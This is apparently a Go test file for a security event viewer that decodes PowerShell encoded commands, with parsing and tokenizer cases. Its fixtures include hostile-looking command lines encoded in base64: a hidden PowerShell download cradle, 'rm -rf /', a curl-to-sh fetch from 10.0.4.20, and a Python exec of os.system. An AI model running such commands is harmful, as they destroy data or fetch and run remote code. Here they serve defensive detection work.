package ocsfview

import "testing"

// TestDecodeCommandLine: PowerShell's encoded command decodes when PowerShell
// is the program of the line and the token is clean UTF-16LE, and nothing
// else does (adr/0300). The switch is found in any of the spellings
// PowerShell's parser accepts and only among its host options; a line whose
// program is a shell, a wrapper or any other tool is not read, whatever it
// names further on. Innocent command lines never decode.
func TestDecodeCommandLine(t *testing.T) {
	cases := []struct {
		name, cmd, encoding, text string
	}{
		{"powershell -EncodedCommand", `powershell.exe -NoProfile -EncodedCommand ZQBjAGgAbwA=`, EncodingBase64UTF16LE, "echo"},
		{"powershell -enc, quoted", `powershell -nop -w hidden -enc "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"`, EncodingBase64UTF16LE, "IEX (New-Object Net.WebClient)"},
		{"powershell -e", `powershell -e ZQBjAGgAbwA=`, EncodingBase64UTF16LE, "echo"},
		{"powershell /ec", `pwsh /ec ZQBjAGgAbwA=`, EncodingBase64UTF16LE, "echo"},
		{"powershell by path", `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass -EncodedCommand ZQBjAGgAbwA=`, EncodingBase64UTF16LE, "echo"},
		{"pwsh --EncodedCommand, the second dash stripped as PowerShell does", `pwsh --EncodedCommand ZQBjAGgAbwA=`, EncodingBase64UTF16LE, "echo"},
		{"options that take values are stepped over", `powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Version 5.1 -NonInteractive -e ZQBjAGgAbwA=`, EncodingBase64UTF16LE, "echo"},
		{"quoted program path with spaces", `"C:\Program Files\PowerShell\7\pwsh.exe" -enc ZQBjAGgAbwA=`, EncodingBase64UTF16LE, "echo"},
		{"an unquoted install path with spaces", `C:\Program Files\PowerShell\7\pwsh.exe -e ZQBjAGgAbwA=`, EncodingBase64UTF16LE, "echo"},
		{"an unquoted install path with a parenthesised directory", `C:\Program Files (x86)\Windows PowerShell\powershell.exe -e ZQBjAGgAbwA=`, EncodingBase64UTF16LE, "echo"},
		{"an unquoted install path with forward slashes", `C:/Program Files/PowerShell/7/pwsh.exe -e ZQBjAGgAbwA=`, EncodingBase64UTF16LE, "echo"},
		{"an unquoted install path with a dot-led directory", `C:\Program .tools\pwsh.exe -e ZQBjAGgAbwA=`, EncodingBase64UTF16LE, "echo"},
		{"the ISE has no encoded command", `powershell_ise.exe -enc ZQBjAGgAbwA=`, "", ""},
		{"the ISE by path", `C:\Windows\System32\WindowsPowerShell\v1.0\powershell_ise.exe -enc ZQBjAGgAbwA=`, "", ""},
		{"an unquoted path with spaces that is not PowerShell", `C:\Program Files\Tool\run.exe powershell -e ZQBjAGgAbwA=`, "", ""},
		{"a program file with a path, PowerShell as its argument", `C:\Tools\launcher.exe powershell -e ZQBjAGgAbwA=`, "", ""},
		{"an extensionless program with a path, PowerShell as its argument", `C:\Tools\launcher powershell -e ZQBjAGgAbwA=`, "", ""},
		{"a file of another kind with a path, PowerShell as its argument", `C:\Tools\wrapper.dll powershell -e ZQBjAGgAbwA=`, "", ""},
		{"an extensionless program with a path, PowerShell's full path as its argument", `C:\Tools\launcher C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -e ZQBjAGgAbwA=`, "", ""},
		{"an extensionless program with a path, a relative PowerShell path as its argument", `C:\Tools\launcher .\bin\powershell -e ZQBjAGgAbwA=`, "", ""},
		{"an extensionless program with a path, a rooted PowerShell path as its argument", `C:\Tools\launcher \bin\powershell.exe -e ZQBjAGgAbwA=`, "", ""},
		{"an extensionless program with a path, a parent-relative PowerShell path as its argument", `C:\Tools\launcher ..\bin\powershell.exe -e ZQBjAGgAbwA=`, "", ""},
		{"a POSIX path", `/usr/bin/pwsh -nop -e ZQBjAGgAbwA=`, EncodingBase64UTF16LE, "echo"},
		{"an escaped space in a POSIX path", `/opt/my\ tools/pwsh -e ZQBjAGgAbwA=`, EncodingBase64UTF16LE, "echo"},
		{"a POSIX path in apostrophes", `'/opt/my tools/pwsh' -e ZQBjAGgAbwA=`, EncodingBase64UTF16LE, "echo"},
		{"a POSIX argv joined without quoting is not recovered", `/opt/my tools/pwsh -e ZQBjAGgAbwA=`, "", ""},
		{"sh's double-quote escapes on a POSIX line", `/usr/bin/pwsh -wd "C:\\x \"y\" $z" -e ZQBjAGgAbwA=`, EncodingBase64UTF16LE, "echo"},
		{"explicit alias -ep takes a value", `powershell.exe -ep Bypass -enc ZQBjAGgAbwA=`, EncodingBase64UTF16LE, "echo"},
		{"explicit aliases -if -of -ea -wd take values", `pwsh -if Text -of XML -ea AAAA -wd "C:\Program Files" -e ZQBjAGgAbwA=`, EncodingBase64UTF16LE, "echo"},
		{"abbreviations resolve in the parser's order (-in is Interactive, -s is ServerMode)", `pwsh -in -s -e ZQBjAGgAbwA=`, EncodingBase64UTF16LE, "echo"},
		{"Windows PowerShell -version takes a value", `powershell -version 2 -e ZQBjAGgAbwA=`, EncodingBase64UTF16LE, "echo"},
		{"pwsh -version stops the parse, so nothing after it is read", `pwsh -version 7 -e ZQBjAGgAbwA=`, "", ""},
		{"pwsh -v likewise", `pwsh -v -e ZQBjAGgAbwA=`, "", ""},
		{"-help does not stop the parse: the encoded command is designated, whether or not PowerShell then runs it", `pwsh -help -e ZQBjAGgAbwA=`, EncodingBase64UTF16LE, "echo"},
		{"Windows PowerShell -ImportSystemModules is a flag", `powershell -ImportSystemModules -e ZQBjAGgAbwA=`, EncodingBase64UTF16LE, "echo"},
		{"quoted encoded token", `powershell -enc "ZQBjAGgAbwA="`, EncodingBase64UTF16LE, "echo"},
		{"a quoted value with spaces", `powershell -wd "C:\Program Files" -enc ZQBjAGgAbwA=`, EncodingBase64UTF16LE, "echo"},
		{"a backslash-escaped quote is a literal quote, so the value splits and the options end", `powershell -wd \"C:\Program Files\" -enc ZQBjAGgAbwA=`, "", ""},
		{"a lost closing quote makes the rest of the line one word, so nothing is read", `"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -enc ZQBjAGgAbwA=`, "", ""},
		{"a stray quote after the program", `powershell.exe" -nop -enc ZQBjAGgAbwA=`, "", ""},
		{"an unmatched quote hands -w the rest of the line", `powershell -nop -w "hidden -enc ZQBjAGgAbwA= \"x`, "", ""},
		{"apostrophes on a Windows line are handed to PowerShell, which cannot decode them", `powershell -nop -enc 'ZQBjAGgAbwA='`, "", ""},
		{"a token in the URL alphabet is not one PowerShell can decode", `powershell -enc ZQBjAGgAbwAgACcAPwA_AD8AJwA=`, "", ""},
		{"an unknown switch ends the options as a file", `pwsh -foo -e ZQBjAGgAbwA=`, "", ""},
		{"-cwa ends the options", `pwsh -cwa whoami -e ZQBjAGgAbwA=`, "", ""},
		{"-e after -File is the script's argument", `powershell.exe -File .\probe.ps1 -e ZQBjAGgAbwA=`, "", ""},
		{"-e after -Command is the command's text", `powershell -Command Get-Process -e ZQBjAGgAbwA=`, "", ""},
		{"-e after a bare script word is the script's argument", `powershell .\probe.ps1 -e ZQBjAGgAbwA=`, "", ""},
		{"-e after a lone dash reads from stdin", `pwsh - -e ZQBjAGgAbwA=`, "", ""},
		{"-EncodedArguments is not the command", `pwsh -EncodedArguments ZQBjAGgAbwA= -File .\probe.ps1`, "", ""},
		{"a flagged token that is not UTF-16 is nothing", `powershell -enc d2hvYW1pOyBybSAtcmYgLw==`, "", ""},
		{"a quoted multi-word token is nothing", `powershell -e "d2hvYW1pOyBybSAtcmYgLw== x"`, "", ""},
		{"utf-16 garbage after a real flag", `powershell -enc hostname`, "", ""},
		{"odd utf-16 length after -enc", `powershell -enc ZWNob3c=`, "", ""},
		{"an empty token", `powershell -e ""`, "", ""},
		{"the switch with nothing after it", `powershell -nop -enc`, "", ""},
		// Programs that are not PowerShell are not read, whatever follows: the
		// shell and wrapper forms show as stored.
		{"cmd /c", `cmd.exe /c powershell -nop -w hidden -enc ZQBjAGgAbwA=`, "", ""},
		{"cmd /c with a quoted sub-command", `cmd.exe /c "powershell -nop -w hidden -enc ZQBjAGgAbwA="`, "", ""},
		{"cmd /c start", `cmd.exe /c start powershell -enc ZQBjAGgAbwA=`, "", ""},
		{"a chain operator", `whoami && powershell -enc ZQBjAGgAbwA=`, "", ""},
		{"sh -c", `/bin/sh -c 'pwsh -nop -e ZQBjAGgAbwA='`, "", ""},
		{"sudo", `sudo -u root pwsh -e ZQBjAGgAbwA=`, "", ""},
		{"nohup", `nohup pwsh -e ZQBjAGgAbwA= &`, "", ""},
		{"powershell named as data on another command line", `echo powershell -enc ZQBjAGgAbwA=`, "", ""},
		{"powershell as a value, not the program", `schtasks /create /tn Updater /tr powershell -enc ZQBjAGgAbwA=`, "", ""},
		{"a shell's bare base64 blob", `sh -c "echo Y3VybCBodHRwOi8vMTAuMC40LjIwL3N0YWdlIHwgc2g= | base64 -d | sh"`, "", ""},
		{"another tool's -e is not PowerShell's", `ssh -e hostname user@host`, "", ""},
		{"grep -e", `grep -e Database /etc/passwd`, "", ""},
		{"perl -e", `perl -e TESTTEST`, "", ""},
		{"bare base64 of a script", `python3 -c exec(__import__("base64").b64decode("aW1wb3J0IG9zOyBvcy5zeXN0ZW0oImlkIik="))`, "", ""},
		{"plain command", `C:\Windows\System32\svchost.exe -k netsvcs -p -s Schedule`, "", ""},
		{"a long alphanumeric word", `cmd.exe /c MicrosoftEdgeUpdateCore.exe`, "", ""},
		{"a guid", `rundll32.exe {4D36E972-E325-11CE-BFC1-08002BE10318}`, "", ""},
		{"a sha256", `certutil -hashfile a.exe SHA256 9f1c2e3d4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d`, "", ""},
		{"binary that is valid base64", `tool --blob AAECAwQFBgcICQoLDA0ODw==`, "", ""},
		{"empty", ``, "", ""},
	}
	for _, c := range cases {
		encoding, text, ok := decodeCommandLine(c.cmd)
		if c.encoding == "" {
			if ok {
				t.Errorf("%s: decoded %q as %s; want nothing", c.name, text, encoding)
			}
			continue
		}
		if !ok || encoding != c.encoding || text != c.text {
			t.Errorf("%s: = %q %q %v; want %s %q", c.name, encoding, text, ok, c.encoding, c.text)
		}
	}
}

// TestRender_DecodedBesideTheOriginal: the process view carries the decoded
// command beside the field as stored; the group-by key stays on the stored
// value; a plain command line has no decoded slot; the scheduled job's
// command line decodes the same way.
func TestRender_DecodedBesideTheOriginal(t *testing.T) {
	v := Render(Event{ClassUID: 1007, Payload: payload(`{"process":{"name":"powershell.exe","pid":1,"cmd_line":"powershell.exe -NoProfile -EncodedCommand ZQBjAGgAbwA="}}`)}, nil)
	if v.Decoded == nil || v.Decoded.Field != "process.cmd_line" || v.Decoded.Encoding != EncodingBase64UTF16LE || v.Decoded.Text != "echo" {
		t.Fatalf("decoded = %+v; want process.cmd_line base64-utf16le echo", v.Decoded)
	}
	if f, ok := fieldValue(v, "Command line"); !ok || f.Value != "powershell.exe -NoProfile -EncodedCommand ZQBjAGgAbwA=" {
		t.Errorf("the stored command line is not rendered as stored: %+v", f)
	}
	for _, sv := range v.Slots {
		if sv.Name == "cmd_line" && sv.Identity != "powershell.exe -NoProfile -EncodedCommand ZQBjAGgAbwA=" {
			t.Errorf("group-by key = %q; want the stored value", sv.Identity)
		}
	}
	plain := Render(Event{ClassUID: 1007, Payload: payload(`{"process":{"name":"svchost.exe","cmd_line":"svchost.exe -k netsvcs"}}`)}, nil)
	if plain.Decoded != nil {
		t.Errorf("plain command line decoded: %+v", plain.Decoded)
	}
	job := Render(Event{ClassUID: 1006, Payload: payload(`{"job":{"name":"Updater","cmd_line":"pwsh -enc ZQBjAGgAbwA="}}`)}, nil)
	if job.Decoded == nil || job.Decoded.Field != "job.cmd_line" || job.Decoded.Text != "echo" {
		t.Errorf("job decoded = %+v; want job.cmd_line echo", job.Decoded)
	}
	// From OCSF 1.9.0 the command line is the job's action. The first one is
	// the one read back.
	job = Render(Event{ClassUID: 1006, Payload: payload(`{"job":{"name":"Updater","job_actions":[{"cmd_line":"pwsh -enc ZQBjAGgAbwA="},{"cmd_line":"b.exe"}]}}`)}, nil)
	if job.Decoded == nil || job.Decoded.Field != "job.job_actions[0].cmd_line" || job.Decoded.Text != "echo" {
		t.Errorf("job decoded = %+v; want job.job_actions[0].cmd_line echo", job.Decoded)
	}
}

// TestTokenize: words split as the shell hands them to the program; a quoted
// word is one token with its quotes removed, whatever it holds; a quote may
// open inside a word, and one with no match runs to the end of the line; an
// apostrophe quotes under POSIX rules and is text under Windows rules.
func TestTokenize(t *testing.T) {
	line := `"C:\Program Files\pwsh.exe" -wd it's "say \"hi\" && x" ""C:\p q" a" tail`
	check := func(name string, got, want []token) {
		t.Helper()
		if len(got) != len(want) {
			t.Fatalf("%s: tokens = %+v; want %+v", name, got, want)
		}
		for i := range want {
			if got[i] != want[i] {
				t.Errorf("%s: token %d = %+v; want %+v", name, i, got[i], want[i])
			}
		}
	}
	check("windows", tokenize(line, false), []token{
		{text: `C:\Program Files\pwsh.exe`, quoted: true},
		{text: "-wd"},
		{text: "it's"},
		{text: `say "hi" && x`, quoted: true},
		{text: `C:\p`, quoted: true},
		{text: `q a`, quoted: true},
		{text: "tail"},
	})
	check("posix", tokenize(`'a b' it's`, true), []token{{text: "a b", quoted: true}, {text: "its", quoted: true}})
	if got := tokenize("", false); len(got) != 0 {
		t.Errorf("empty line tokenized to %+v", got)
	}
	if got := tokenize(`a "unterminated -e ZQBjAGgAbwA=`, false); len(got) != 2 || !got[1].quoted || got[1].text != `unterminated -e ZQBjAGgAbwA=` {
		t.Errorf("unmatched quote = %+v; want the rest of the line as one word", got)
	}
	if got := tokenize(`"a ""b"" c"`, false); len(got) != 1 || got[0].text != `a "b" c` {
		t.Errorf("argv doubled quote = %+v; want one token a \"b\" c", got)
	}
	if got := tokenize(`"it\'s" 'x'`, true); len(got) != 2 || got[0].text != `it\'s` {
		t.Errorf("posix backslash-apostrophe inside double quotes = %+v; want it\\'s kept", got)
	}
	if got := tokenize(`a\ b c`, true); len(got) != 2 || got[0].text != "a b" {
		t.Errorf("posix escaped space = %+v; want one word a b", got)
	}
	if got := tokenize(`"a\\b \"c\" \$d \x"`, true); len(got) != 1 || got[0].text != `a\b "c" $d \x` {
		t.Errorf("posix escapes inside double quotes = %+v; want a\\b \"c\" $d \\x", got)
	}
	if got := tokenize(`"a\\b \"c\""`, false); len(got) != 1 || got[0].text != `a\\b "c"` {
		t.Errorf("argv escapes inside double quotes = %+v; want a\\\\b \"c\" (backslashes are text except before a quote)", got)
	}
}
